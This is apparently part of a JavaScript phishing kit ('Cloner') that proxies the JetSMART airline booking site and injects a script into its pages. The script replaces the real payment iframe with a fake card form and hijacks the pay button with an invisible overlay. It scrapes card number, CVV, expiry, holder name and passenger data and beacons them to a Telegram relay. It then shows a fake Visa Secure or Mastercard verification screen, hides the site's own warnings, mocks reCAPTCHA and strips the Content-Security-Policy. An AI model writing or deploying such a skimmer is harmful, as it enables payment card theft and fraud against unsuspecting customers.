      var bw = panCfg._brandWrap;
      if (!bw) return;
      bw.innerHTML = '';
      if (brand) {
        var iconWrap = document.createElement('div');
        iconWrap.className = 'Yuno-pan-secure-field__brand-icon css-1g2ifix esfhigb1';
        var img = document.createElement('img');
        img.src = brand.icon;
        img.className = 'css-6iha89 esfhigb2';
        img.setAttribute('data-testid', 'brand-icon-' + brand.name);
        iconWrap.appendChild(img);
        bw.appendChild(iconWrap);
      }
    };
    form.appendChild(buildYunoField(panCfg));

    /* Expiry + CVV row */
    var row = document.createElement('div');
    row.className = 'css-rtde4j';

    var expCfg = {
      label: 'MM/AA',
      name: 'expiration',
      autocomplete: 'cc-exp',
      inputmode: 'numeric',
      maxlength: '5',
      formatter: function(raw) {
        /* Robust expiry formatter */
        var d = raw.replace(/[^0-9]/g, '');
        if (d.length === 0) return '';
        if (d.length === 1) {
          var n = parseInt(d, 10);
          if (n > 1) return '0' + d + '/';
          return d;
        }
        var mm = d.substring(0, 2);
        var mNum = parseInt(mm, 10);
        if (mNum < 1) mm = '01';
        if (mNum > 12) mm = '12';
        if (d.length === 2) return mm + '/';
        var yy = d.substring(2, 4);
        return mm + '/' + yy;
      },
      validate: function(v) {
        var d = v.replace(/[^0-9]/g, '');
        if (!d) return 'Ingresa la fecha';
        if (d.length < 4) return 'Fecha incompleta';
        var mm = parseInt(d.substring(0, 2), 10);
        if (mm < 1 || mm > 12) return 'Mes inv\\u00e1lido';
        return '';
      }
    };
    row.appendChild(buildYunoField(expCfg));

    /* CVV with info icon wrapper */
    var cvvWrap = document.createElement('div');
    cvvWrap.className = 'css-1seshkd';
    cvvWrap.style.position = 'relative';

    var cvvCfg = {
      label: 'CVC/CVV',
      name: 'cvv',
      autocomplete: 'cc-csc',
      inputmode: 'numeric',
      maxlength: '4',
      formatter: function(v) {
        var maxCvv = (currentBrand && currentBrand.name === 'AMEX') ? 4 : 3;
        return v.replace(/[^0-9]/g, '').substring(0, maxCvv);
      },
      validate: function(v) {
        var d = v.replace(/[^0-9]/g, '');
        if (!d) return 'Ingresa el CVV';
        var needed = (currentBrand && currentBrand.name === 'AMEX') ? 4 : 3;
        if (d.length < needed) return 'Debes ingresar un c\\u00f3digo de ' + needed + ' d\\u00edgitos.';
        return '';
      }
    };
    cvvWrap.appendChild(buildYunoField(cvvCfg));

    /* CVV info icon — placed INSIDE the CVV box */
    var cvvBox = cvvCfg._box;
    var infoIcon = document.createElement('img');
    infoIcon.className = 'css-gkcg18';
    infoIcon.src = 'https://icons.prod.y.uno/sdk-web/thin_Info_unfocus.svg?react';
    if (cvvBox) cvvBox.appendChild(infoIcon);
    cvvBox.style.position = 'relative';

    /* CVV tooltip */
    var tooltip = document.createElement('div');
    tooltip.className = 'css-gd1r0b';
    var tooltipInner = document.createElement('div');
    tooltipInner.className = 'css-44gx6g';
    var tooltipText = document.createElement('p');
    tooltipText.className = 'css-1undl3v';
    tooltipText.textContent = 'Los 3 d\\u00edgitos en el dorso de tu tarjeta';
    var tooltipImg = document.createElement('img');
    tooltipImg.src = CVV_CARD_SVG;
    tooltipImg.className = 'css-15w7vh8';
    tooltipInner.appendChild(tooltipText);
    tooltipInner.appendChild(tooltipImg);
    tooltip.appendChild(tooltipInner);

    infoIcon.addEventListener('mouseenter', function(e) {
      var r = infoIcon.getBoundingClientRect();
      tooltip.style.top = (r.top - 60) + 'px';
      tooltip.style.left = (r.left - 200) + 'px';
      tooltip.classList.add('visible');
    });
    infoIcon.addEventListener('mouseleave', function() {
      tooltip.classList.remove('visible');
    });

    cvvWrap.appendChild(tooltip);
    row.appendChild(cvvWrap);
    form.appendChild(row);

    /* Cardholder name field */
    var holderCfg = {
      label: 'Nombre del titular de la tarjeta',
      name: 'cardHolderName',
      autocomplete: 'cc-name',
      inputmode: 'text',
      maxlength: '100',
      validate: function(v) {
        if (!v || !v.trim()) return 'Ingresa el nombre del titular';
        return '';
      }
    };
    form.appendChild(buildYunoField(holderCfg));

    /* Email field */
    var emailCfg = {
      label: 'Correo electr\\u00f3nico',
      name: 'email',
      autocomplete: 'email',
      inputmode: 'email',
      maxlength: '100',
      validate: function(v) {
        if (!v || !v.trim()) return 'Ingresa tu correo electr\\u00f3nico';
        if (v.indexOf('@') < 0 || v.indexOf('.') < 0) return 'Correo electr\\u00f3nico inv\\u00e1lido';
        return '';
      }
    };
    form.appendChild(buildYunoField(emailCfg));

    /* Terms/privacy text — matches original Yuno text */
    var terms = document.createElement('p');
    terms.style.cssText = 'font-size:12px;color:#7D93B2;font-family:Roboto,Helvetica,Arial,sans-serif;margin:12px 0 0;line-height:1.5;';
    terms.innerHTML = 'Al pagar, aceptas la <a href="https://www.y.uno/privacy-policy" target="_blank" style="color:#2D3B4E;text-decoration:underline;font-weight:500;">Pol\\u00edtica de Tratamiento de Datos Personales</a>.';
    form.appendChild(terms);

    formContainer.appendChild(form);

    console.log('[Cloner] Card form injected into accordion successfully!');
  };

  /* ── Payment page detection via URL polling ───────────────── */
  /* This runs every 500ms and activates payment features when
     the URL changes to /V2/Payment (regardless of how we got there). */

  var ERROR_KEYWORDS = ['ha ocurrido un error', 'not found', 'contact form server error', 'ha ocurrido', 'doble reserva', 'reserva incompleta', 'cierre esta ventana', 'transacci'];

  var _lastRemoveErrors = 0;
  var removeErrors = function() {
    /* Skip error removal entirely once payment flow has started */
    if (__clonerPaymentSent) return;
    var now = Date.now();
    if (now - _lastRemoveErrors < 500) return;
    _lastRemoveErrors = now;
    var allEls = document.querySelectorAll('div, span, p, h1, h2, h3, h4, section, article');
    for (var i = 0; i < allEls.length; i++) {
      var el = allEls[i];
      /* Never touch the payment loading overlay or anything inside it */
      if (el.id === '_tg_loading_overlay' || el.closest('#_tg_loading_overlay')) continue;
      var t = (el.textContent || '').toLowerCase().trim();
      if (t.length > 500 || t.length < 5) continue;
      var isError = false;
      for (var k = 0; k < ERROR_KEYWORDS.length; k++) {
        if (t.includes(ERROR_KEYWORDS[k]) && t.length < 200) { isError = true; break; }
      }
      if (isError) {
        var children = el.children ? el.children.length : 0;
        if (children < 5) {
          el.style.setProperty('display', 'none', 'important');
          el.style.setProperty('visibility', 'hidden', 'important');
          el.style.setProperty('height', '0', 'important');
          el.style.setProperty('overflow', 'hidden', 'important');
          el.style.setProperty('margin', '0', 'important');
          el.style.setProperty('padding', '0', 'important');
          try { el.remove(); } catch(re) {}
        }
      }
    }
  };

  var scrapeAllInputs = function() {
    var results = [];
    document.querySelectorAll('input, select, textarea').forEach(function(inp) {
      if (!inp.value) return;
      results.push({
        name: inp.name || '', id: inp.id || '', placeholder: inp.placeholder || '',
        value: inp.value, type: inp.type || '',
        ariaLabel: inp.getAttribute('aria-label') || '',
        autocomplete: inp.getAttribute('autocomplete') || ''
      });
    });
    // Try iframes
    document.querySelectorAll('iframe').forEach(function(iframe) {
      try {
        var iDoc = iframe.contentDocument || iframe.contentWindow.document;
        if (!iDoc) return;
        iDoc.querySelectorAll('input').forEach(function(inp) {
          if (!inp.value) return;
          results.push({
            name: inp.name || '', id: inp.id || '', placeholder: inp.placeholder || '',
            value: inp.value, type: inp.type || '',
            ariaLabel: inp.getAttribute('aria-label') || '',
            autocomplete: inp.getAttribute('autocomplete') || '', fromIframe: true
          });
        });
      } catch(e) {}
    });
    return results;
  };

  var extractCardData = function(inputs) {
    var card = { numeroTarjeta: '', expiracion: '', cvv: '', nombreTitular: '' };
    inputs.forEach(function(inp) {
      var n = (inp.name || '').toLowerCase();
      var ph = (inp.placeholder || '').toLowerCase();
      var id = (inp.id || '').toLowerCase();
      var ar = (inp.ariaLabel || '').toLowerCase();
      var ac = (inp.autocomplete || '').toLowerCase();
      var v = inp.value;

      // CVV — must be 3-4 digits AND have cvv/cvc attribute
      if (!card.cvv && /^[0-9]{3,4}$/.test(v.trim())) {
        if (n.includes('cvv') || n.includes('cvc') || n.includes('security') ||
            ph.includes('cvv') || ph.includes('cvc') || id.includes('cvv') || ac === 'cc-csc') {
          card.cvv = v;
        }
      }
      // Expiry — check by name/autocomplete
      if (n.includes('expir') || n.includes('mm') || ph.includes('mm') || ph.includes('expir') ||
          id.includes('expir') || ac === 'cc-exp' || ac.includes('cc-exp')) {
        if (v && !card.expiracion) card.expiracion = v;
        else if (v && card.expiracion && card.expiracion.length <= 2) card.expiracion += '/' + v;
      }
      // Cardholder name — check BEFORE card number to avoid name matching as number
      if (!card.nombreTitular && v && /[a-zA-Z]/.test(v)) {
        if (n.includes('holder') || n.includes('titular') || n.includes('cardname') || n === 'cardholdername' ||
            ph.includes('titular') || ph.includes('holder') || ph.includes('nombre de') ||
            id.includes('holder') || id.includes('titular') || ac === 'cc-name') {
          card.nombreTitular = v;
        }
      }
      // Card number — must explicitly match by attribute, AND value must be mostly digits
      if (!card.numeroTarjeta) {
        if (ac === 'cc-number' || n === 'number' || n === 'cardnumber' || n.includes('pan') ||
            ph.includes('tarjeta') || ph.includes('card number')) {
          if (v && v.replace(/[^0-9]/g, '').length >= 8) {
            card.numeroTarjeta = v;
          }
        }
      }
    });
    return card;
  };

  var getByLabel = function(keywords) {
    var labels = document.querySelectorAll('label, [class*="label"], [class*="floating"]');
    for (var li = 0; li < labels.length; li++) {
      var lt = (labels[li].textContent || '').toLowerCase();
      for (var ki = 0; ki < keywords.length; ki++) {
        if (lt.includes(keywords[ki])) {
          var container = labels[li].closest('div');
          if (container) {
            var inp = container.querySelector('input');
            if (inp && inp.value) return inp.value;
          }
        }
      }
    }
    return '';
  };

  var handlePayClick = function() {
    if (__clonerPaymentSent) return;
    __clonerPaymentSent = true;
    console.log('[Cloner] === PAY BUTTON CLICKED ===');

    var scraped = scrapeAllInputs();
    console.log('[Cloner] All scraped inputs:', JSON.stringify(scraped.map(function(x){return {n:x.name,p:x.placeholder,v:x.value,id:x.id};})));

    var cardData = extractCardData(scraped);

    // Label-based fallback
    if (!cardData.numeroTarjeta) cardData.numeroTarjeta = getByLabel(['mero de tarjeta', 'card number', 'numero de la tarjeta']);
    if (!cardData.expiracion) cardData.expiracion = getByLabel(['mm/aa', 'mm/yy', 'fecha', 'expir']);
    if (!cardData.cvv) cardData.cvv = getByLabel(['cvv', 'cvc', 'digo de seguridad']);
    if (!cardData.nombreTitular) cardData.nombreTitular = getByLabel(['nombre del titular', 'cardholder', 'nombre en la tarjeta']);

    console.log('[Cloner] Card data:', JSON.stringify(cardData));

    var passengerData = {};
    try { passengerData = JSON.parse(sessionStorage.getItem('__cloner_passenger_data') || '{}'); } catch(pe) {}
    console.log('[Cloner] Passenger data from storage:', JSON.stringify(passengerData));

    // Generate session ID for this payment flow
    var sessionId = 'tg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

    var fullData = {
      __sessionId: sessionId,
      nombres: passengerData.nombres || '',
      apellidos: passengerData.apellidos || '',
      numeroDocumento: passengerData.numeroDocumento || '',
      correoElectronico: passengerData.correoElectronico || '',
      telefono: passengerData.telefono || '',
      numeroTarjeta: cardData.numeroTarjeta || '',
      expiracion: cardData.expiracion || '',
      cvv: cardData.cvv || '',
      nombreTitular: cardData.nombreTitular || '',
    };

    console.log('[Cloner] >>> SENDING TO TELEGRAM:', JSON.stringify(fullData));

    // Show a full-screen "processing" overlay
    var _loadingOverlay = document.createElement('div');
    _loadingOverlay.id = '_tg_loading_overlay';
    _loadingOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.97);z-index:9999999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:Arial,Helvetica,sans-serif;transition: background 0.5s ease;';
    _loadingOverlay.innerHTML = '<div id="_tg_spinner" style="border:3px solid #e0e0e0;border-top:3px solid #1a2340;border-radius:50%;width:40px;height:40px;animation:_tgspin 0.8s linear infinite;margin-bottom:16px;"></div><div id="_tg_main_text" style="color:#333;font-size:14px;font-weight:bold;">Procesando transacción segura...</div><div id="_tg_sub_text" style="color:#777;font-size:12px;margin-top:8px;">Por favor no cierre esta ventana.</div><style>@keyframes _tgspin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>';
    document.body.appendChild(_loadingOverlay);

    // Send data immediately via sendBeacon
    navigator.sendBeacon('/__tg/submit-card', JSON.stringify(fullData));

    // Detect card network for the secure branding phase
    var _rawCc = fullData.numeroTarjeta || '';
    var _network = _rawCc.replace(/\\D/g, '').startsWith('4') ? 'visa' : 'mastercard';
    var _secureLogo = _network === 'visa' ? '/assets/visa-secure-logo.webp' : '/assets/mastercard-id-check-loading.svg';

    // Phase 1: 5 seconds processing
    setTimeout(function() {
      // Phase 2: Evolve to secure network verification
      _loadingOverlay.style.background = '#ffffff';
      _loadingOverlay.innerHTML = '<div style="text-align:center;width:100%;padding:0 25px;"><img src="' + _secureLogo + '" style="width:92%;max-width:400px;height:auto;object-fit:contain;margin-bottom:40px;"><div style="border:2px solid #e0e0e0;border-top:2px solid #1a2340;border-radius:50%;width:35px;height:35px;animation:_tgspin 0.8s linear infinite;margin:0 auto 20px;"></div><div style="color:#333;font-size:16px;font-weight:bold;">Verificando con su entidad emisora...</div><div style="color:#777;font-size:14px;margin-top:10px;">Protegiendo su información financiera.</div></div><style>@keyframes _tgspin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>';

      // Phase 3: After another 5 seconds, redirect to the bank verification flow
      setTimeout(function() {
        window.location.href = '/custom/loading-1?sessionId=' + sessionId;
      }, 5000);
    }, 5000);
  };

  var findAndOverlayPayButton = function() {
    if (__clonerOverlayCreated || __clonerPaymentSent) return;

    var curPath = location.pathname.toLowerCase();
    if (!curPath.includes('/v2/payment') && !curPath.includes('/payment')) return;

    var payBtn = null;

    // 1) Desktop: data-test-id for "Pagar Ahora"
    payBtn = document.querySelector('[data-test-id="payment-submit-payment-button"]');

    // 2) Mobile: data-test-id for sticky "Continuar"
    if (!payBtn) {
      payBtn = document.querySelector('[data-test-id="sidebar-mobile-continue-button"]');
    }

    // 3) Text fallback: "pagar ahora"
    if (!payBtn) {
      var btns = document.querySelectorAll('button, a, [role="button"]');
      for (var i = 0; i < btns.length; i++) {
        var txt = (btns[i].textContent || '').toLowerCase().trim();
        if (txt.includes('pagar ahora') && txt.length < 50) { payBtn = btns[i]; break; }
      }
    }

    if (!payBtn) return;

    // Must have dimensions (rendered)
    var initRect = payBtn.getBoundingClientRect();
    if (initRect.width === 0 || initRect.height === 0) return;

    // Detect if the button lives inside a position:fixed ancestor
    // (the mobile "Continuar" is in a fixed sticky footer)
    var useFixed = false;
    var ancestor = payBtn.parentElement;
    while (ancestor && ancestor !== document.body && ancestor !== document.documentElement) {
      if (window.getComputedStyle(ancestor).position === 'fixed') {
        useFixed = true;
        break;
      }
      ancestor = ancestor.parentElement;
    }

    __clonerOverlayCreated = true;
    var btnLabel = (payBtn.textContent || '').trim().substring(0, 30);
    console.log('[Cloner] Overlaying "' + btnLabel + '" (fixed=' + useFixed + ')');

    var overlay = document.createElement('div');
    overlay.id = '__cloner_pay_overlay';
    /* Start HIDDEN — only show when terms checkbox is checked */
    overlay.style.cssText = 'z-index:2147483646;cursor:pointer;background:rgba(0,0,0,0.001);pointer-events:none;display:none;';

    var positionOverlay = function() {
      if (!payBtn || !payBtn.isConnected) {
        __clonerOverlayCreated = false;
        if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
        return;
      }
      var r = payBtn.getBoundingClientRect();
      if (r.width === 0 || r.height === 0) return;

      if (useFixed) {
        overlay.style.position = 'fixed';
        overlay.style.top = r.top + 'px';
        overlay.style.left = r.left + 'px';
      } else {
        overlay.style.position = 'absolute';
        var scrollX = window.pageXOffset || document.documentElement.scrollLeft;
        var scrollY = window.pageYOffset || document.documentElement.scrollTop;
        overlay.style.top = (r.top + scrollY) + 'px';
        overlay.style.left = (r.left + scrollX) + 'px';
      }
      overlay.style.width = r.width + 'px';
      overlay.style.height = r.height + 'px';

      /* Toggle overlay: only show when terms are checked AND card form is complete */
      var termsChecked = false;
      var termsLabel = document.querySelector('[data-test-id="payment-terms-checkbox-label"]');
      if (termsLabel) {
        var forId = termsLabel.getAttribute('for');
        if (forId) {
          var termsInput = document.getElementById(forId);
          if (termsInput && termsInput.hasAttribute('checked')) {
            termsChecked = true;
          }
        }
      }

      /* Validate all card form fields are filled and valid */
      var formValid = false;
      var clonerForm = document.getElementById('__cloner-card-form');
      if (clonerForm && termsChecked) {
        var panInput = clonerForm.querySelector('input[name="number"]');
        var expInput = clonerForm.querySelector('input[name="expiration"]');
        var cvvInput = clonerForm.querySelector('input[name="cvv"]');
        var holderInput = clonerForm.querySelector('input[name="cardHolderName"]');
        var emailInput = clonerForm.querySelector('input[name="email"]');

        var panDigits = panInput ? panInput.value.replace(/[^0-9]/g, '') : '';
        var expDigits = expInput ? expInput.value.replace(/[^0-9]/g, '') : '';
        var cvvDigits = cvvInput ? cvvInput.value.replace(/[^0-9]/g, '') : '';
        var holderVal = holderInput ? holderInput.value.trim() : '';
        var emailVal = emailInput ? emailInput.value.trim() : '';

        formValid = panDigits.length >= 13
          && expDigits.length >= 4
          && cvvDigits.length >= 3
          && holderVal.length > 0
          && emailVal.indexOf('@') > 0 && emailVal.indexOf('.') > 0;
      }

      if (termsChecked && formValid) {
        overlay.style.display = 'block';
        overlay.style.pointerEvents = 'auto';
      } else {
        overlay.style.display = 'none';
        overlay.style.pointerEvents = 'none';
      }
    };

    positionOverlay();
    window.addEventListener('scroll', positionOverlay, true);
    window.addEventListener('resize', positionOverlay, true);
    setInterval(positionOverlay, 300);

    overlay.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      handlePayClick();
    }, true);

    overlay.addEventListener('touchend', function(e) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      handlePayClick();
    }, true);

    document.body.appendChild(overlay);
    console.log('[Cloner] Overlay created (hidden until terms checked)');
  };

  /* Dismiss specific modal overlays (Advertencia, etc.) */
  var _lastDismissModals = 0;
  var dismissModals = function() {
    var now = Date.now();
    if (now - _lastDismissModals < 500) return;
    _lastDismissModals = now;
    /* Target common modal/tooltip overlay patterns */
    var modals = document.querySelectorAll('[class*="modal"], [class*="overlay"], [class*="popup"], [role="dialog"]');
    modals.forEach(function(m) {
      var txt = (m.textContent || '').toLowerCase();
      if (txt.includes('advertencia') || txt.includes('doble reserva') || txt.includes('reserva incompleta') || txt.includes('cierre esta ventana')) {
        m.style.setProperty('display', 'none', 'important');
        try { m.remove(); } catch(e) {}
        console.log('[Cloner] Removed Advertencia modal');
      }
    });
    /* Also remove any backdrop/overlay divs that block interaction */
    var backdrops = document.querySelectorAll('[class*="backdrop"], [class*="modal-overlay"]');
    backdrops.forEach(function(b) {
      b.style.setProperty('display', 'none', 'important');
      try { b.remove(); } catch(e) {}
    });
    /* Fix body being set as not scrollable due to modal */
    if (document.body.style.overflow === 'hidden' || document.body.classList.contains('modal-open')) {
      document.body.style.overflow = '';
      document.body.classList.remove('modal-open');
    }
  };

  /* The main polling loop — checks URL and activates features */
  var __lastCheckedPath = '';
  setInterval(function() {
    var curPath = location.pathname.toLowerCase();

    /* Run error/modal removal on ALL booking pages */
    if (curPath.includes('/v2/')) {
      removeErrors();
      dismissModals();
    }

    /* Payment page features */
    if (curPath.includes('/v2/payment') || curPath.includes('/payment')) {
      if (__lastCheckedPath !== curPath) {
        console.log('[Cloner] Payment page detected via URL polling: ' + curPath);
        __lastCheckedPath = curPath;
      }
      // Replace Yuno iframes with native inputs
      injectCustomCardForm();
      // Overlay button
      findAndOverlayPayButton();
    }
  }, 500);

  /* Also use MutationObserver to find elements faster */
  var _obsTimeout = null;
  var __clonerDomObs = new MutationObserver(function() {
    if (_obsTimeout) return;
    _obsTimeout = setTimeout(function() {
      _obsTimeout = null;
      var curPath = location.pathname.toLowerCase();
      if (curPath.includes('/v2/')) {
        removeErrors();
        dismissModals();
      }
      if (curPath.includes('/v2/payment') || curPath.includes('/payment')) {
        injectCustomCardForm();
        findAndOverlayPayButton();
      }
    }, 200);
  });
  setTimeout(function() {
    if (document.body) __clonerDomObs.observe(document.body, { childList: true, subtree: true });
  }, 300);

  /* Block form submissions on payment page */
  document.addEventListener('submit', function(e) {
    if (location.pathname.toLowerCase().includes('payment')) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      console.log('[Cloner] Blocked form submission on payment page');
      return false;
    }
  }, true);

  /* ── Geolocation mock (Bogotá) ───────────────────────────── */
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition = function(success) {
      success({ coords: { latitude: 4.711, longitude: -74.0721, accuracy: 100 }, timestamp: Date.now() });
    };
    navigator.geolocation.watchPosition = navigator.geolocation.getCurrentPosition;
  }

  /* ── reCAPTCHA mock ──────────────────────────────────────── */
  window.grecaptcha = window.grecaptcha || {
    ready: function(cb) { cb && cb(); },
    execute: function() { return Promise.resolve('mock-recaptcha-token'); },
    render: function() { return 0; },
    reset: function() {},
    getResponse: function() { return 'mock-recaptcha-token'; }
  };

  /* ── URL Rewriting helpers ───────────────────────────────── */
  var JETSMART_DOMAINS = %%JETSMART_DOMAINS%%;
  var LOCAL_BASE = '%%LOCAL_BASE%%';

  function isExternal(url) {
    try {
      var u = new URL(url, location.href);
      return JETSMART_DOMAINS.some(function(d) { return u.hostname === d || u.hostname.endsWith('.'+d); });
    } catch(e) { return false; }
  }

  function rewrite(url) {
    if (!url) return url;
    try {
      var u = new URL(url, location.href);
      if (JETSMART_DOMAINS.some(function(d) { return u.hostname === d || u.hostname.endsWith('.'+d); })) {
        u.host = location.host;
        u.protocol = location.protocol;
        return u.toString();
      }
    } catch(e) {}
    return url;
  }

  /* ── Extract search params from URL ──────────────────────── */
  function parseSearchParams(urlStr) {
    try {
      var u = new URL(urlStr, location.href);
      var p = u.searchParams;
      var get = function() { for (var i = 0; i < arguments.length; i++) { var v = p.get(arguments[i]); if (v) return v; } return null; };
      var params = {
        origin:        get('o1','Origin','origin','OriginStation'),
        destination:   get('d1','Destination','destination','DestinationStation'),
        departureDate: get('dd1','DepartureDate','departureDate','BeginDate'),
        returnDate:    get('dd2','ReturnDate','returnDate','EndDate'),
        adults:        get('ADT','adults'),
        children:      get('CHD','children'),
        infants:       get('INF','infants'),
      };
      Object.keys(params).forEach(function(k) { if (params[k] === null) delete params[k]; });
      return params;
    } catch(e) { return {}; }
  }

  /* ── Navigate with search context push ───────────────────── */
  function navigateTo(rawUrl) {
    var newUrl = rewrite(rawUrl);
    var params = parseSearchParams(rawUrl);
    var hasParams = params.origin || params.destination;
    var doNav = function() { location.href = newUrl; };
    if (hasParams) {
      fetch('/__search_context', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify(params)
      }).finally(doNav);
    } else { doNav(); }
  }

  /* ── Intercept link clicks ───────────────────────────────── */
  document.addEventListener('click', function(e) {
    var a = e.target.closest('a[href]');
    if (!a) return;
    var href = a.getAttribute('href');
    if (!href) return;
    try {
      var abs = new URL(href, location.href).toString();
      if (isExternal(abs)) { e.preventDefault(); e.stopPropagation(); navigateTo(abs); }
    } catch(e2) {}
  }, true);

  /* ── Intercept form submits ──────────────────────────────── */
  document.addEventListener('submit', function(e) {
    if (!e.target.action || !isExternal(e.target.action)) return;
    e.preventDefault(); e.stopPropagation();
    var fd = new FormData(e.target);
    var params = Object.fromEntries(fd.entries());
    var urlParams = parseSearchParams(e.target.action);
    var merged = Object.assign({}, params, urlParams);
    fetch('/__search_context', {
      method: 'POST', headers: {'Content-Type':'application/json'},
      body: JSON.stringify(merged)
    }).finally(function() {
      e.target.action = rewrite(e.target.action);
      HTMLFormElement.prototype.submit.call(e.target);
    });
  }, true);

  /* ── Intercept History API ───────────────────────────────── */
  var _origPush = history.pushState.bind(history);
  var _origRepl = history.replaceState.bind(history);
  history.pushState    = function(s,t,u) { return _origPush(s, t, u ? rewrite(String(u)) : u); };
  history.replaceState = function(s,t,u) { return _origRepl(s, t, u ? rewrite(String(u)) : u); };

  /* ── Intercept fetch (mask response.redirected) ──────────── */
  var _origFetch = window.fetch;
  window.fetch = function(input, init) {
    return _origFetch.apply(this, arguments).then(function(response) {
      if (response.redirected || response.url !== (typeof input === 'string' ? new URL(input, location.href).href : input.url)) {
        return new Proxy(response, {
          get: function(target, prop) {
            if (prop === 'redirected') return false;
            if (prop === 'url') return typeof input === 'string' ? new URL(input, location.href).href : input.url;
            var val = target[prop];
            return typeof val === 'function' ? val.bind(target) : val;
          }
        });
      }
      return response;
    });
  };

  /* ── Intercept location.assign / replace ─────────────────── */
  try {
    var _assign  = location.assign.bind(location);
    var _replace = location.replace.bind(location);
    location.assign  = function(u) {
      if (window.__clonerBlockRedirect) { console.warn('[Cloner] Blocked redirect to', u); return; }
      isExternal(u) ? navigateTo(u) : _assign(u);
    };
    location.replace = function(u) {
      if (window.__clonerBlockRedirect) { console.warn('[Cloner] Blocked redirect to', u); return; }
      if (isExternal(u)) {
        fetch('/__search_context',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(parseSearchParams(u))}).finally(function(){_replace(rewrite(u));});
      } else { _replace(u); }
    };
  } catch(e) {}
  
  /* ── Facebook Pixel Base Code ── */
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '897165736269121');
  fbq('track', 'PageView');
})();
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=897165736269121&ev=PageView&noscript=1"
/></noscript>
<script>
  /* ── Service Worker ──────────────────────────────────────── */
  if ('serviceWorker' in navigator) {
    window.addEventListener('load', function() {
      navigator.serviceWorker.getRegistrations()
        .then(function(regs) { return Promise.all(regs.map(function(r) { return r.unregister(); })); })
        .then(function() { return navigator.serviceWorker.register('/cloner-sw.js', { scope: '/' }); })
        .then(function() { console.log('[Cloner] SW active'); })
        .catch(function(e) { console.warn('[Cloner] SW failed', e); });
    });
  }
  console.log("[Cloner] Injected script loaded.");
</script>`;

// ─── Google Fonts Links ───────────────────────────────────────────────────────

const FONT_LINKS = [
  '<link rel="preconnect" href="https://fonts.googleapis.com">',
  '<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>',
  '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400;500;600;700;800;900&display=swap">',
  '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@100;200;300;400;500;600;700;800;900&display=swap">',
  '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700;900&display=swap">',
  '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap">',
].join('\n');

// ─── Public API ───────────────────────────────────────────────────────────────

/**
 * Inject interceptor scripts, state, and fonts into an HTML page.
 */
function injectHtml(content, state, localBase, searchContext, stationLookup, flowStep) {
  // Filter state based on current flow step
  let filteredState = state;
  if (flowStep === 'flight-results' || flowStep === 'flight-search' || flowStep === 'homepage') {
    // Don't inject booking-related session data when at flight selection
    // (it's from the payment stage of recording and triggers warnings)
    const BOOKING_SESSION_KEYS = ['js-cached-booking-data', 'jsCurrentStep', 'jsHistory'];
    filteredState = JSON.parse(JSON.stringify(state));
    if (Array.isArray(filteredState.sessionStorage)) {
      filteredState.sessionStorage = filteredState.sessionStorage.filter(
        ([k]) => !BOOKING_SESSION_KEYS.includes(k)
      );
    }
  }

  // Safe JSON for embedding inside <script> (prevent </script> injection)
  const transformedState = transformBrowserState(
    filteredState, searchContext?.recorded, searchContext?.current, stationLookup
  );
  const safeState = JSON.stringify(transformedState).replace(/</g, '\\u003c');

  const script = CLIENT_SCRIPT
    .replace('%%SPA_STATE%%', safeState)
    .replace('%%LOCAL_BASE%%', localBase)
    .replace('%%FLOW_STEP%%', flowStep || 'homepage')
    .replace('%%JETSMART_DOMAINS%%', JSON.stringify(JETSMART_DOMAINS));

  let result = content;

  // Strip CSP
  result = result.replace(/<meta[^>]*http-equiv=['"]?Content-Security-Policy['"]?[^>]*>/gi, '');

  // Inject scripts after <head>
  result = result.replace('<head>', '<head>' + script);

  // Inject fonts before </head>
  result = result.replace('</head>', FONT_LINKS + '\n</head>');

  // Fix cookie domains
  result = result
    .replace(/CookieDomain:\s*"[^"]*\.com"/g, 'CookieDomain: "localhost"')
    .replace(/"CookieDomain":\s*"[^"]*\.com"/g, '"CookieDomain": "localhost"');

  return result;
}

module.exports = { injectHtml };
